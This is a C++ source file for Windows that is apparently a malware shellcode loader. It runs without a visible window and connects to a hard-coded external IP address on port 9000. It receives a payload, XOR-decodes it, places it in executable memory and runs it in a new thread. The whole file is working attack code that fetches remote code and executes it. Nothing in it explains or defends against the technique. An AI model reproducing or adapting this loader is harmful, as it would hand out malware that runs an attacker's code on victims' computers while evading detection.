#include <stdio.h>
#include <iostream>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib") 
#pragma warning(disable:4996)
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )

using namespace std;

int main(int argc, char* argv[])
{
	const int BUF_SIZE = 1024;

	WSADATA			wsd; 
	SOCKET			sHost; 
	SOCKADDR_IN		servAddr; 
	char			buf[BUF_SIZE]; 
	char			bufRecv[BUF_SIZE]; 
	DWORD			dwThreadId;
	HANDLE			hThread;
	DWORD			dwOldProtect;

	int retVal;



	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)
	{
		
		return -1;
	}

	sHost = socket(AF_INET, SOCK_STREAM, 0); 
	if (INVALID_SOCKET == sHost)
	{
		
		WSACleanup();
		return  -1;
	}


	servAddr.sin_family = AF_INET; 
	servAddr.sin_addr.s_addr = inet_addr("47.243.95.0"); 
	servAddr.sin_port = htons((short)atoi("9000")); 



	retVal = connect(sHost, (LPSOCKADDR)&servAddr, sizeof(servAddr)); 
	if (SOCKET_ERROR == retVal)
	{
		
		closesocket(sHost);
		WSACleanup();
		return -1;
	}
	ZeroMemory(buf, BUF_SIZE); 
	strcpy(buf, "ok"); 

	retVal = send(sHost, buf, strlen(buf), 0);

	if (SOCKET_ERROR == retVal) 
	{
		
		closesocket(sHost);
		WSACleanup();
		return -1;
	}
	
	ZeroMemory(bufRecv, BUF_SIZE); 
	Sleep(2000); 


	recv(sHost, bufRecv, BUF_SIZE, 0); 

	Sleep(4000);
	closesocket(sHost);
	WSACleanup();

	for (int i = 0; i < sizeof(bufRecv); i++) {
		_InterlockedXor8(bufRecv + i, 7);
	}
	

	
	char* shellcode = (char*)VirtualAlloc(
		NULL,
		BUF_SIZE,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);

	CopyMemory(shellcode, bufRecv, BUF_SIZE);
	VirtualProtect(shellcode, BUF_SIZE, PAGE_EXECUTE, &dwOldProtect); 

	hThread = CreateThread(
		NULL, 
		NULL, 
		(LPTHREAD_START_ROUTINE)shellcode, 
		NULL,
		NULL,
		&dwThreadId 
	);

	WaitForSingleObject(hThread, INFINITE);
	return 0;
}